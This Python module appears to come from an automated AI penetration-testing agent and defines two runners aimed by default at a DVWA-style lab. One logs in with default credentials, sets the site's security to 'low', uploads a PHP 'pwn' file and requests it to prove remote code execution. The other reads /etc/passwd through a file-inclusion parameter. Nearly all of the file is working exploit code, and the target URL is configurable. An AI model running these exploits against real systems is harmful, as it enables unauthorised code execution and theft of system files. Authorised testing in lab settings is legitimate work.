from __future__ import annotations

import json
import re
import secrets
from typing import Any

import httpx

from services.agent_runtime.kernel.contracts import (
    ExecutionRequest,
    ExecutionResult,
)


def _token(html: str) -> str:
    match = re.search(
        r"name=['\"]user_token['\"][^>]*value=['\"]([^'\"]+)['\"]",
        html,
        re.IGNORECASE,
    )
    return match.group(1) if match else ""


def _login(
    client: httpx.Client,
    *,
    username: str,
    password: str,
    login_path: str = "/login.php",
    login_fields: dict[str, str] | None = None,
) -> bool:
    login_url = login_path
    page = client.get(login_url)
    if login_fields:
        data = {
            key: str(value)
            .replace("{username}", username)
            .replace("{password}", password)
            for key, value in login_fields.items()
        }
    else:
        data = {
            "username": username,
            "password": password,
            "Login": "Login",
        }
        token = _token(page.text)
        if token:
            data["user_token"] = token
    response = client.post(login_url, data=data)
    return "Login failed" not in response.text


def _set_security_low(
    client: httpx.Client,
    *,
    security_path: str = "/security.php",
    enabled: bool = True,
) -> None:
    if not enabled:
        return
    page = client.get(security_path)
    data = {"security": "low", "seclev_submit": "Submit"}
    token = _token(page.text)
    if token:
        data["user_token"] = token
    client.post("/security.php", data=data)


class FileUploadTesterRunner:
    """Authenticated unrestricted-file-upload -> RCE tester."""

    def __init__(self, timeout: float = 20.0) -> None:
        self._timeout = timeout
        self.executions: list[ExecutionRequest] = []

    def execute(self, request: ExecutionRequest) -> ExecutionResult:
        self.executions.append(request)
        base = str(
            request.input.get("target")
            or request.input.get("url")
            or ""
        ).rstrip("/")
        if not base:
            return ExecutionResult(
                action_id=request.action_id,
                status="failed",
                exit_code=1,
                stderr="file-upload tester requires target",
                side_effect_state="known",
            )
        username = str(request.input.get("username") or "admin")
        password = str(request.input.get("password") or "password")
        upload_path = str(
            request.input.get("upload_path")
            or "/vulnerabilities/upload/"
        )
        login_path = str(request.input.get("login_path") or "/login.php")
        security_path = str(
            request.input.get("security_path") or "/security.php"
        )
        uploads_dir = str(
            request.input.get("uploads_dir") or "/hackable/uploads/"
        )
        login_fields = request.input.get("login_fields")
        set_security = bool(request.input.get("set_security", True))
        marker = str(
            request.input.get("marker")
            or f"N3TSEC{secrets.token_hex(4)}"
        )
        shell_name = f"pwn_{marker}.php"

        observation: dict[str, Any] = {
            "kind": "file_upload_rce",
            "endpoint": (
                upload_path
                if upload_path.startswith(("http://", "https://"))
                else f"{base}{upload_path}"
            ),
            "method": "POST",
            "marker": marker,
        }
        try:
            with httpx.Client(
                base_url=base,
                timeout=self._timeout,
                verify=False,
                trust_env=False,
                follow_redirects=True,
            ) as client:
                if not _login(
                    client,
                    username=username,
                    password=password,
                    login_path=login_path,
                    login_fields=(
                        dict(login_fields) if login_fields else None
                    ),
                ):
                    observation["login"] = "failed"
                    return self._result(request, observation)
                _set_security_low(
                    client,
                    security_path=security_path,
                    enabled=set_security,
                )
                upload_page = client.get(upload_path)
                data = {"Upload": "Upload"}
                token = _token(upload_page.text)
                if token:
                    data["user_token"] = token
                upload_response = client.post(
                    upload_path,
                    files={
                        "uploaded": (
                            shell_name,
                            f"<?php echo '{marker}'; ?>",
                            "application/x-php",
                        )
                    },
                    data=data,
                )
                observation["upload_status"] = upload_response.status_code
                observation["uploaded"] = (
                    "succesfully uploaded" in upload_response.text
                    or "successfully uploaded" in upload_response.text
                )
                shell_url = f"{uploads_dir.rstrip('/')}/{shell_name}"
                execution_response = client.get(shell_url)
                observation["execution_status"] = (
                    execution_response.status_code
                )
                observation["marker_present"] = (
                    marker in execution_response.text
                )
                if observation["marker_present"]:
                    observation["vuln_category"] = "RCE"
                    observation["replay_proof"] = {
                        "marker": marker,
                        "shell_url": f"{base}{shell_url}",
                        "upload_status": observation["upload_status"],
                        "execution_status": observation[
                            "execution_status"
                        ],
                    }
        except httpx.HTTPError as error:
            observation["error"] = str(error)
        return self._result(request, observation)

    def _result(
        self,
        request: ExecutionRequest,
        observation: dict[str, Any],
    ) -> ExecutionResult:
        return ExecutionResult(
            action_id=request.action_id,
            status="completed",
            exit_code=0,
            stdout=json.dumps(
                {"observation_count": 1},
                ensure_ascii=True,
            ),
            observations=(observation,),
            artifact_refs=(
                f"artifact://file-upload/{request.action_id}",
            ),
            side_effect_state="known",
        )


class LFITesterRunner:
    """Authenticated local file inclusion tester."""

    def __init__(self, timeout: float = 20.0) -> None:
        self._timeout = timeout
        self.executions: list[ExecutionRequest] = []

    def execute(self, request: ExecutionRequest) -> ExecutionResult:
        self.executions.append(request)
        base = str(
            request.input.get("target")
            or request.input.get("url")
            or ""
        ).rstrip("/")
        if not base:
            return ExecutionResult(
                action_id=request.action_id,
                status="failed",
                exit_code=1,
                stderr="lfi tester requires target",
                side_effect_state="known",
            )
        username = str(request.input.get("username") or "admin")
        password = str(request.input.get("password") or "password")
        lfi_path = str(
            request.input.get("lfi_path")
            or "/vulnerabilities/fi/"
        )
        login_path = str(request.input.get("login_path") or "/login.php")
        security_path = str(
            request.input.get("security_path") or "/security.php"
        )
        file_to_read = str(
            request.input.get("file_to_read") or "/etc/passwd"
        )
        login_fields = request.input.get("login_fields")
        set_security = bool(request.input.get("set_security", True))
        observation: dict[str, Any] = {
            "kind": "lfi",
            "endpoint": (
                lfi_path
                if lfi_path.startswith(("http://", "https://"))
                else f"{base}{lfi_path}"
            ),
            "method": "GET",
        }
        try:
            with httpx.Client(
                base_url=base,
                timeout=self._timeout,
                verify=False,
                trust_env=False,
                follow_redirects=True,
            ) as client:
                if not _login(
                    client,
                    username=username,
                    password=password,
                    login_path=login_path,
                    login_fields=(
                        dict(login_fields) if login_fields else None
                    ),
                ):
                    observation["login"] = "failed"
                    return self._result(request, observation)
                _set_security_low(
                    client,
                    security_path=security_path,
                    enabled=set_security,
                )
                response = client.get(
                    lfi_path,
                    params={"page": file_to_read},
                )
                observation["status"] = response.status_code
                observation["has_file_content"] = (
                    "root:" in response.text
                    or "daemon:" in response.text
                )
                if observation["has_file_content"]:
                    observation["vuln_category"] = "LFI"
                    observation["replay_proof"] = {
                        "path": f"{lfi_path}?page={file_to_read}",
                        "status": observation["status"],
                        "file": file_to_read,
                    }
        except httpx.HTTPError as error:
            observation["error"] = str(error)
        return self._result(request, observation)

    def _result(
        self,
        request: ExecutionRequest,
        observation: dict[str, Any],
    ) -> ExecutionResult:
        return ExecutionResult(
            action_id=request.action_id,
            status="completed",
            exit_code=0,
            stdout=json.dumps(
                {"observation_count": 1},
                ensure_ascii=True,
            ),
            observations=(observation,),
            artifact_refs=(f"artifact://lfi/{request.action_id}",),
            side_effect_state="known",
        )
